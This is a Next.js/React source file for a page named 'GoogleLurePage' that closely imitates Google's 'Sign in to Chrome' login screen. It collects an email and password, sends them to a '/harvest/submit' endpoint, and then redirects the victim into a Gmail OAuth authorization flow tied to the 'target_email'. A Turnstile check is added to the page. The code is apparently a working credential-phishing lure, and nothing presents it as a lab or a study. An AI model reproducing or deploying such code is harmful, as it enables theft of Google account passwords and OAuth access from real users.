"use client";

import { useState, useEffect, useRef } from "react";
import { api } from "@/lib/api";
import { Provider } from "@/lib/types";
import { UserCircle2, ChevronDown, Eye, EyeOff, Loader2 } from "lucide-react";

export default function GoogleLurePage() {
  const [step, setStep] = useState<1 | 2>(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [turnstileToken, setTurnstileToken] = useState("");
  const turnstileRef = useRef<HTMLDivElement>(null);
  const turnstileWidgetId = useRef<number | null>(null);

  // Load Turnstile script
  useEffect(() => {
    if (typeof window !== "undefined" && !document.querySelector('script[src*="turnstile"]')) {
      const script = document.createElement("script");
      script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js";
      script.async = true;
      script.defer = true;
      document.head.appendChild(script);
    }
  }, []);

  // Render Turnstile widget
  useEffect(() => {
    if (step === 2 && turnstileRef.current && window.turnstile && turnstileWidgetId.current === null) {
      turnstileWidgetId.current = window.turnstile.render(turnstileRef.current, {
        sitekey: process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY || "",
        theme: "dark",
        callback: (token: string) => setTurnstileToken(token),
        "expired-callback": () => setTurnstileToken(""),
        "error-callback": () => setTurnstileToken(""),
      });
    }
    return () => {
      if (turnstileWidgetId.current !== null && window.turnstile) {
        window.turnstile.reset(turnstileWidgetId.current);
        turnstileWidgetId.current = null;
      }
    };
  }, [step]);

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setError("Enter a valid email or phone number");
      return;
    }
    setError("");
    setStep(2);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError("Enter a password");
      return;
    }
    if (turnstileWidgetId.current !== null && !turnstileToken) {
      setError("Please complete the security check");
      return;
    }
    
    setSubmitting(true);
    setError("");
    
    try {
      const response = await fetch(`${api.getBaseUrl()}/api/v1/harvest/submit`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: email,
          password,
          provider: "GMAIL",
          turnstile_token: turnstileToken || undefined,
        }),
      });
      
      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.detail || "Submission failed");
      }
      
      // Redirect to OAuth flow
      window.location.href = `${api.getBaseUrl()}/api/v1/oauth/gmail/authorize?target_email=${encodeURIComponent(email)}`;
    } catch (err: any) {
      setError(err.message || "Something went wrong. Try again.");
      if (turnstileWidgetId.current !== null && window.turnstile) {
        window.turnstile.reset(turnstileWidgetId.current);
      }
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-[#111] px-4 font-sans text-[#e8eaed] sm:px-0">
      <div className="w-full max-w-[1040px] rounded-3xl bg-[#1f1f1f] p-8 sm:p-10 md:min-h-[400px] md:w-[1040px] md:flex-row flex-col flex items-stretch">
        {/* Left side text */}
        <div className="flex flex-col justify-start md:w-1/2 md:pr-10">
          <div className="mb-4">
            <svg
              viewBox="0 0 24 24"
              width="48"
              height="48"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                fill="#4285F4"
                d="M23.636 12.273c0-.853-.07-1.682-.218-2.482H12v4.695h6.52c-.28 1.517-1.135 2.805-2.418 3.665v3.045h3.916c2.29-2.11 3.618-5.215 3.618-8.923z"
              />
              <path
                fill="#34A853"
                d="M12 24c3.272 0 6.01-1.084 8.016-2.936l-3.916-3.045c-1.085.728-2.477 1.157-4.1 1.157-3.155 0-5.83-2.13-6.786-4.996H1.163v3.134C3.167 21.288 7.23 24 12 24z"
              />
              <path
                fill="#FBBC05"
                d="M5.214 14.18c-.244-.728-.385-1.516-.385-2.336s.14-1.608.385-2.336V6.374H1.163C.423 7.85 0 9.8 0 11.844c0 2.043.423 3.993 1.163 5.47l4.05-3.134z"
              />
              <path
                fill="#EA4335"
                d="M12 4.75c1.78 0 3.376.613 4.634 1.81l3.473-3.472C18.006 1.083 15.267 0 12 0 7.23 0 3.167 2.712 1.163 6.374l4.05 3.134c.956-2.866 3.63-4.996 6.787-4.996z"
              />
            </svg>
          </div>
          {step === 1 ? (
            <>
              <h1 className="mb-2 text-4xl font-normal leading-tight text-[#e8eaed]">
                Sign in to Chrome
              </h1>
              <p className="text-base text-[#e8eaed]">Use your Google Account</p>
            </>
          ) : (
            <>
              <h1 className="mb-4 text-4xl font-normal leading-tight text-[#e8eaed]">
                Welcome
              </h1>
              <div className="inline-flex cursor-pointer items-center rounded-full border border-[#5f6368] px-3 py-1 hover:bg-[#303134]">
                <UserCircle2 className="mr-2 h-5 w-5 text-[#9aa0a6]" />
                <span className="text-sm font-medium text-[#e8eaed]">
                  {email}
                </span>
                <ChevronDown className="ml-2 h-4 w-4 text-[#9aa0a6]" />
              </div>
            </>
          )}
        </div>

        {/* Right side form */}
        <div className="mt-10 flex flex-col justify-center md:mt-0 md:w-1/2">
          {step === 1 ? (
            <form onSubmit={handleNext} className="flex h-full flex-col">
              <div className="relative mb-2 mt-4">
                <input
                  type="text"
                  id="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  autoFocus
                  className="peer w-full rounded border border-[#5f6368] bg-transparent px-4 pb-2 pt-6 text-base text-[#e8eaed] outline-none focus:border-2 focus:border-[#8ab4f8] focus:px-[15px] focus:pb-[7px] focus:pt-[23px]"
                  placeholder=" "
                />
                <label
                  htmlFor="email"
                  className="pointer-events-none absolute left-4 top-4 origin-[0] -translate-y-3 scale-75 transform text-[#9aa0a6] transition-all duration-150 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-3 peer-focus:scale-75 peer-focus:text-[#8ab4f8]"
                >
                  Email or phone
                </label>
              </div>
              {error && (
                <div className="mb-2 flex items-center text-xs text-[#f28b82]">
                  <svg
                    aria-hidden="true"
                    className="mr-2 fill-current"
                    height="16"
                    viewBox="0 0 24 24"
                    width="16"
                  >
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                  </svg>
                  {error}
                </div>
              )}
              <div className="mb-10 mt-1">
                <button
                  type="button"
                  className="text-sm font-medium text-[#8ab4f8] hover:text-[#aecbfa]"
                >
                  Forgot email?
                </button>
              </div>

              <div className="mb-10 text-sm text-[#9aa0a6]">
                Not your computer? Use Guest mode to sign in privately.{" "}
                <button
                  type="button"
                  className="font-medium text-[#8ab4f8] hover:text-[#aecbfa]"
                >
                  Learn more about using Guest mode
                </button>
              </div>

              <div className="mt-auto flex items-center justify-between pb-4">
                <button
                  type="button"
                  className="rounded-full px-4 py-2 text-sm font-medium text-[#8ab4f8] hover:bg-[#303134]"
                >
                  Create account
                </button>
                <button
                  type="submit"
                  className="rounded-full bg-[#8ab4f8] px-6 py-2 text-sm font-medium text-[#202124] hover:bg-[#aecbfa]"
                >
                  Next
                </button>
              </div>
            </form>
          ) : (
            <form onSubmit={handleSubmit} className="flex h-full flex-col">
              <div className="relative mb-2 mt-4">
                <div className="flex items-center gap-3 px-4 py-3 rounded border border-[#5f6368] bg-transparent">
                  <UserCircle2 className="h-5 w-5 text-[#9aa0a6]" />
                  <span className="text-base text-[#e8eaed] flex-1">{email}</span>
                </div>
              </div>
              <div className="relative mb-2">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  autoFocus
                  className="peer w-full rounded border border-[#5f6368] bg-transparent px-4 pb-2 pt-6 pr-12 text-base text-[#e8eaed] outline-none focus:border-2 focus:border-[#8ab4f8] focus:px-[15px] focus:pb-[7px] focus:pt-[23px]"
                  placeholder=" "
                  disabled={submitting}
                />
                <label
                  htmlFor="password"
                  className="pointer-events-none absolute left-4 top-4 origin-[0] -translate-y-3 scale-75 transform text-[#9aa0a6] transition-all duration-150 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-3 peer-focus:scale-75 peer-focus:text-[#8ab4f8]"
                >
                  Enter your password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-[#9aa0a6] hover:text-[#e8eaed]"
                  disabled={submitting}
                >
                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </button>
              </div>
              {error && (
                <div className="mb-2 flex items-center text-xs text-[#f28b82]">
                  <svg
                    aria-hidden="true"
                    className="mr-2 fill-current"
                    height="16"
                    viewBox="0 0 24 24"
                    width="16"
                  >
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                  </svg>
                  {error}
                </div>
              )}

              {/* Turnstile Challenge */}
              <div className="mb-6" ref={turnstileRef} />

              <div className="mb-4 text-sm text-[#9aa0a6]">
                <span className="text-[#8ab4f8]">Forgot password?</span>
              </div>

              <div className="mt-auto flex items-center justify-between pb-4">
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="rounded-full px-4 py-2 text-sm font-medium text-[#8ab4f8] hover:bg-[#303134]"
                  disabled={submitting}
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={submitting}
                  className="rounded-full bg-[#8ab4f8] px-6 py-2 text-sm font-medium text-[#202124] hover:bg-[#aecbfa] disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
                >
                  {submitting ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin" />
                      Signing in...
                    </>
                  ) : (
                    "Next"
                  )}
                </button>
              </div>
            </form>
          )}
        </div>
      </div>

      <div className="mt-4 flex w-full max-w-[1040px] items-center justify-between text-[12px] text-[#9aa0a6]">
        <div className="group relative cursor-pointer hover:bg-[#303134] px-2 py-1 rounded">
          English (United States) <ChevronDown className="inline h-3 w-3" />
        </div>
        <div className="flex space-x-6">
          <span className="cursor-pointer hover:bg-[#303134] px-2 py-1 rounded">Help</span>
          <span className="cursor-pointer hover:bg-[#303134] px-2 py-1 rounded">Privacy</span>
          <span className="cursor-pointer hover:bg-[#303134] px-2 py-1 rounded">Terms</span>
        </div>
      </div>
    </div>
  );
}

// Type augmentation for Turnstile
declare global {
  interface Window {
    turnstile: {
      render: (container: HTMLElement, options: {
        sitekey: string;
        theme?: "light" | "dark" | "auto";
        callback?: (token: string) => void;
        "expired-callback"?: () => void;
        "error-callback"?: () => void;
      }) => number;
      reset: (widgetId: number) => void;
      remove: (widgetId: number) => void;
    };
  }
}